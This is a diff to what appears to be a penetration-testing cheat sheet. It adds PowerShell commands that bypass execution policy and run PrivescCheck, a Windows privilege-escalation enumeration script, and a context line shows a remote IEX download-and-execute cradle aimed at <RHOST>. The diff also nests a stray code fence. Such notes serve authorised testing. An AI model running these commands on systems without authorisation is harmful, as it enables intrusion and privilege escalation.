@@ -4662,7 +4662,14 @@ Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).do
 #### PrivescCheck
 
 ```c
-. .\PrivescCheck.ps1; Invoke-PrivescCheck
+Set-ExecutionPolicy Bypass -Scope Process -Force
+. .\PrivescCheck.ps1
+
+```c
+Get-Content .\PrivescCheck.ps1 | Out-String | Invoke-Expression
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
 ```
 
 #### pwncat
